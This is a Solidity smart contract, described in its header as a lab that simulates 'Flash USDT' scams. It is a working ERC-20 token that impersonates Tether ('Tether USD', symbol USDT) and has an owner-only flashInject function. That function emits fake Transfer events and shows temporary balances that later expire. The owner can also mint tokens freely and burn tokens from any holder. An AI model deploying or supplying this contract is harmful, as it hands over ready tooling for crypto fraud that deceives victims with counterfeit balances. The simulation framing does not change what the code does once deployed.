// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlashUSDTLab (ERC-20)
 * @notice Token lab EVM — simula estafas Flash USDT (modo token falso + modo flash pendiente).
 */
contract FlashUSDTLab {
    string public constant name = "Tether USD";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;

    address public owner;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    struct FlashCredit {
        uint256 amount;
        uint256 expiresAt;
    }

    mapping(address => FlashCredit) private _flash;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event LabMint(address indexed to, uint256 amount);
    event LabBurn(address indexed holder, uint256 amount);
    event LabInject(address indexed to, uint256 amount);
    event LabFlashInject(address indexed to, uint256 amount, uint256 expiresAt);
    event LabFlashCleared(address indexed holder, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "FlashUSDTLab: not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        uint256 base = _balances[account];
        FlashCredit memory f = _flash[account];
        if (f.amount > 0 && block.timestamp < f.expiresAt) {
            return base + f.amount;
        }
        return base;
    }

    function flashBalanceOf(address account) external view returns (uint256) {
        FlashCredit memory f = _flash[account];
        if (f.amount > 0 && block.timestamp < f.expiresAt) {
            return f.amount;
        }
        return 0;
    }

    function flashExpiresAt(address account) external view returns (uint256) {
        return _flash[account].expiresAt;
    }

    function realBalanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address tokenOwner, address spender) external view returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(currentAllowance >= amount, "FlashUSDTLab: insufficient allowance");
        unchecked {
            _approve(from, msg.sender, currentAllowance - amount);
        }
        _transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "FlashUSDTLab: mint to zero");
        _totalSupply += amount;
        _balances[to] += amount;
        emit Transfer(address(0), to, amount);
        emit LabMint(to, amount);
    }

    function injectTo(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "FlashUSDTLab: inject to zero");
        if (_balances[owner] < amount) {
            uint256 deficit = amount - _balances[owner];
            _totalSupply += deficit;
            _balances[owner] += deficit;
            emit Transfer(address(0), owner, deficit);
            emit LabMint(owner, deficit);
        }
        _transfer(owner, to, amount);
        emit LabInject(to, amount);
    }

    function flashInject(address to, uint256 amount, uint256 durationSeconds) external onlyOwner {
        require(to != address(0), "FlashUSDTLab: flash to zero");
        require(amount > 0, "FlashUSDTLab: zero amount");
        require(durationSeconds >= 60 && durationSeconds <= 30 days, "FlashUSDTLab: bad duration");

        uint256 expiresAt = block.timestamp + durationSeconds;
        _flash[to] = FlashCredit({ amount: amount, expiresAt: expiresAt });

        emit Transfer(owner, to, amount);
        emit LabFlashInject(to, amount, expiresAt);
    }

    function clearFlash(address holder) external onlyOwner {
        FlashCredit memory f = _flash[holder];
        if (f.amount > 0) {
            emit LabFlashCleared(holder, f.amount);
        }
        delete _flash[holder];
    }

    function burnFrom(address holder, uint256 amount) external onlyOwner {
        require(holder != address(0), "FlashUSDTLab: burn from zero");
        uint256 balance = _balances[holder];
        require(balance >= amount, "FlashUSDTLab: burn exceeds balance");
        _balances[holder] = balance - amount;
        _totalSupply -= amount;
        emit Transfer(holder, address(0), amount);
        emit LabBurn(holder, amount);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "FlashUSDTLab: zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0) && to != address(0), "FlashUSDTLab: zero address");
        require(_balances[from] >= amount, "FlashUSDTLab: insufficient balance");
        unchecked {
            _balances[from] -= amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address tokenOwner, address spender, uint256 amount) internal {
        require(tokenOwner != address(0) && spender != address(0), "FlashUSDTLab: zero address");
        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }
}
